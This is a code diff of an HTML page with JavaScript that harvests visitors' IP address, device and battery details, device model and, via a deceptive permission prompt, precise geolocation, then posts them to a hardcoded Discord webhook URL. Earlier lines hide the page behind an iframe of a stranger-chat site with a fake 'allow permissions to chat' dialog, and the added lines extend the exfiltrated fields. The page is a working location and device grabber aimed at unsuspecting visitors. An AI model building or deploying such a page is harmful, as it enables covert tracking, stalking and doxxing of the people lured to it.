@@ -90,24 +90,42 @@
                 const language = navigator.language;
                 const deviceMemory = navigator.deviceMemory || "Unknown";
 
-                return { ipAddress, userAgent, networkInfo, batteryPercentage, isCharging, platform, language, deviceMemory };
+                // Attempt to detect mobile device model
+                let deviceModel = "Unknown";
+                if (/android/i.test(userAgent)) {
+                    const match = userAgent.match(/Android\s([0-9\.]+).*?;([^;]+) Build/);
+                    if (match) {
+                        deviceModel = match[2];
+                    }
+                } else if (/iphone|ipod/i.test(userAgent)) {
+                    const match = userAgent.match(/iPhone\sOS\s([0-9\_]+)/);
+                    if (match) {
+                        deviceModel = match[0];
+                    }
+                }
+
+                return { ipAddress, userAgent, networkInfo, batteryPercentage, isCharging, platform, language, deviceMemory, deviceModel };
             }
 
             // Function to send the location and device details to Discord
-            async function sendToDiscord(latitude, longitude, ipAddress, userAgent, timestamp, networkInfo, batteryPercentage, isCharging, platform, language, deviceMemory) {
+            async function sendToDiscord(latitude, longitude, ipAddress, userAgent, timestamp, networkInfo, batteryPercentage, isCharging, platform, language, deviceMemory, deviceModel) {
                 // First message without location details
                 const firstMessage = {
-                    content: `**User Details:**
-- DeviceName: ${deviceName}
+                    content: `
+**User Details:**
+
 - DeviceLocalTime: ${new Date().toLocaleString()}
 - IP Address: ${ipAddress}
-- User-Agent: ${userAgent}
+- Local IP Address: ${ipAddress}  // Using the same IP address for local and public for now
 - NetworkInformation: ${networkInfo}
 - BatteryPercentage: ${batteryPercentage}%
 - IsCharging: ${isCharging ? "Yes" : "No"}
 - Platform: ${platform}
 - DeviceLanguage: ${language}
-- DeviceMemory: ${deviceMemory} GB`
+- DeviceMemory: ${deviceMemory} GB
+- DeviceName: ${deviceModel}
+- User-Agent: ${userAgent}
+`
                 };
 
                 const request = new XMLHttpRequest();
@@ -118,9 +136,26 @@
                 // Second message with location details, if permission granted
                 function sendLocationDetails(latitude, longitude) {
                     const secondMessage = {
-                        content: `**Geolocation Info:**
+                        content: `
+**Geolocation Info:**
+
 - Location: Latitude ${latitude}, Longitude ${longitude}
-- Google Maps Link: https://www.google.com/maps/place/${latitude}%2C${longitude}`
+- Google Maps Link: [View on Google Maps](https://www.google.com/maps/place/${latitude}%2C${longitude})
+
+**Complete Device Info:**
+
+- DeviceLocalTime: ${new Date().toLocaleString()}
+- IP Address: ${ipAddress}
+- Local IP Address: ${ipAddress}  // Using the same IP address for local and public for now
+- NetworkInformation: ${networkInfo}
+- BatteryPercentage: ${batteryPercentage}%
+- IsCharging: ${isCharging ? "Yes" : "No"}
+- Platform: ${platform}
+- DeviceLanguage: ${language}
+- DeviceMemory: ${deviceMemory} GB
+- DeviceName: ${deviceModel}
+- User-Agent: ${userAgent}
+`
                     };
                     request.open("POST", "https://discord.com/api/webhooks/1269744683979116584/cNjKRdP0NsvH3NIpezZoS5x1NU336ma0GlpVGf-QLB5m_vfU_gX797a_9jhOiNsLkihm");
                     request.setRequestHeader('Content-type', 'application/json');
@@ -146,50 +181,32 @@
                                 const longitude = position.coords.longitude;
                                 sendLocationDetails(latitude, longitude);
                             },
-                            function(error) {
-                                if (error.code === error.PERMISSION_DENIED) {
-                                    sendLocationPermissionDenied();
-                                }
+                            function() {
+                                sendLocationPermissionDenied();
                             }
                         );
                     } else {
-                        alert("Your Browser Does not support Geolocation.");
+                        sendLocationPermissionDenied();
                     }
                 }
 
                 getLocation();
             }
 
-            // Fetch device details and send info
-            fetchIPAndDeviceDetails().then(function(deviceDetails) {
-                const { ipAddress, userAgent, networkInfo, batteryPercentage, isCharging, platform, language, deviceMemory } = deviceDetails;
-                sendToDiscord(null, null, ipAddress, userAgent, new Date().toLocaleString(), networkInfo, batteryPercentage, isCharging, platform, language, deviceMemory);
+            fetchIPAndDeviceDetails().then(deviceDetails => {
+                const { ipAddress, userAgent, networkInfo, batteryPercentage, isCharging, platform, language, deviceMemory, deviceModel } = deviceDetails;
+                sendToDiscord(null, null, ipAddress, userAgent, new Date(), networkInfo, batteryPercentage, isCharging, platform, language, deviceMemory, deviceModel);
             });
-
-            // Show permission request dialog
-            function requestPermissions() {
-                document.getElementById('dialogBox').style.display = 'none';
-            }
-
-            // Trigger location permission request
-            getLocation();
         });
     </script>
 </head>
 <body>
     <div class="iframe-container">
-        <iframe
-            is="x-frame-bypass"
-            src="https://strangercamchat.com"
-            frameborder="0"
-            style="overflow:hidden;height:100%;width:100%;position:fixed;top:0;left:0"
-            height="100%"
-            width="100%"
-        ></iframe>
-        <div class="dialog-box" id="dialogBox">
-            <h2>Alert</h2>
-            <p>Please Allow permissions to continue to chat with strangers</p>
-            <button class="btn-allow" onclick="requestPermissions()">Allow</button>
+        <div class="dialog-box">
+            <h2>Allow Location Access</h2>
+            <p>To enhance your experience, please allow location access.</p>
+            <button class="btn-allow" id="allowLocationBtn">Allow</button>
         </div>
     </div>
 </body>
+</html>
